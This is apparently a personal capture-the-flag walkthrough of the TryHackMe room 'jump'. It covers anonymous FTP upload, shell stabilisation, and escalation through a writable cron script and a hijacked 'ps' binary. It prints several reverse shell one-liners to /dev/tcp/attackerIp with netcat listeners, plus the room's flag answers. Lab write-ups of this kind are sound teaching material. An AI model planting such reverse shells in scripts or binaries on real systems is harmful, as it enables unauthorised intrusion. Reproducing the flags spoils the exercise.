# [jump](https://tryhackme.com/room/jump)

## setup

- create a **jump** folder, `cd` in the folder
- connect to the target machine

```bash
ftp targetIp
```

- `anonymous:anonymous`
- new terminal tab in **jump**
- create an `reverse.sh` file

---

```sh
#!/bin/bash

sh -i >& /dev/tcp/attackerIp/4444 0>&1
```

- `sh -i` -> starts an interactive shell, `-i` -> interactive
- `/dev/tcp/attackerIp/4444` -> opens a network connection to your attack machine on port 4444
- `>&` -> redirects both **stdout (1)** and **stderr (2)** to whatever follows, to the socket
- `0>&1` -> redirect input from the socket, since stdout is already the socket, stdin becomes the socket too, now the shell reads commands from the network

---

- start a listener on the attack machine:

```
nc -lnvp 4444
```

---

- `nc` -> netcat
- `-l` -> listen
- `-v` -> verbose (show connection info)
- `-n` -> don't resolve DNS
- `-p 4444` -> listen on port 4444
- this starts to listen on port 4444

---

- on the ftp server move to the `/incoming` folder
- copy the `reverse.sh`

```bash
put reverse.sh
```

- only works if the ftp was started from the folder where the `reverse.sh` is
- go to the listener
- it should be connected
- list the folder content `ls -la`
- there should be the first flag

## recon user

> What is the flag found in the recon_user’s home directory?

```
THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}
```

## dev user

- upgrading the shell (shell stabilisation)

---

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- `python3 -c '...'` -> run this Python code inline
- `import pty` -> load Python's pseudo-terminal module
- `pty.spawn("/bin/bash")` -> launch bash attached to a fake terminal (a PTY)

> shell thinks it's a real terminal, gives a proper prompt and tools like sudo

---

- hit `ctrl+z` -> it will background the listener, then

---

```bash
stty raw -echo; fg
```

- `stty raw` -> passes keystrokes straight through (so Ctrl+C, arrows, etc. reach the target instead of your local machine)
- `-echo` -> stops your local terminal from double-printing what you type
- `;` -> command separator
- `fg` -> foregrounds the backgrounded shell, this is a separate command

---

- type `export TERM=xterm`, enter
- arrived back to the reverse shell
- move up in the folder
- list the content `ls -la`
- move into the `dev_user` folder
- list the content `ls -la`
- cat the flag

> What is the flag found in the dev_user’s home directory?

```
THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}
```

## monitor_user escalation

- got to `/opt`
- `/opt` is the standard Linux folder for optional / add-on software
- anything in `/opt` was deliberately put there, it's a hotspot for PrivEsc (privilege escalation)
- there is a `/app`, `/dev`, `/recon` folder, go to the `/dev`
- in the dev there is a `backup.sh` file
- check the `backup.sh` file `ls -la backup.sh`

```bash
-rwxrwxr-x 1 dev_user dev_user 60 Jun  9 09:03 backup.sh
```

```
-      rwx      rwx      r-x
type   owner    group    others
```

- whoever in the **dev_user** group can write the file
- check the **recon_user** `id`

```bash
uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
```

- the **recon_user** is part of the **dev_user** group
- edit the `backup.sh`
- `nano backup.sh`

```sh
#!/bin/bash
#tar -czf /tmp/recon_backup.tgz /home/recon_user
bash -i >& /dev/tcp/attackerIp/4545 0>&1
```

> `bash` vs `sh` -> bash is more feature rich

- probably the `backup.sh` been run by the **dev_user** as a **cronjob**
- create a listener on the port `4545`

```bash
nc -lnvp 4545
```

- after a minute the reverse shell will let you in as **dev_user**
- upgrade the terminal
- check with `sudo -l` the if it needs password
- check the `/opt/dev/bin` folder
- there is a file called `ps`
- probably the `monitor_user`'s `ps` got hijacked already (thm help)
- `monitor_user` probably calls `ps` regularly
- lets check it out

```bash
ls -la ps
-rw-rw-r-- 1 dev_user dev_user 62 Apr 26 18:19 ps
```

- it can be modified by the **dev_user**

```bash
#!/bin/bash
bash -i >& /dev/tcp/attackerIp/4646 0>&1
```

- make the `ps` executable

```bash
chmod +x ps
```

- start a listener on port `4646`
- after a minute the reverse shell will let you in as **monitor_user**
- upgrade the terminal
- move to the user folder `cd ~`
- `cat` the `flag.txt`

> What is the flag found in the monitor_user’s home directory?

```
THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77}
```
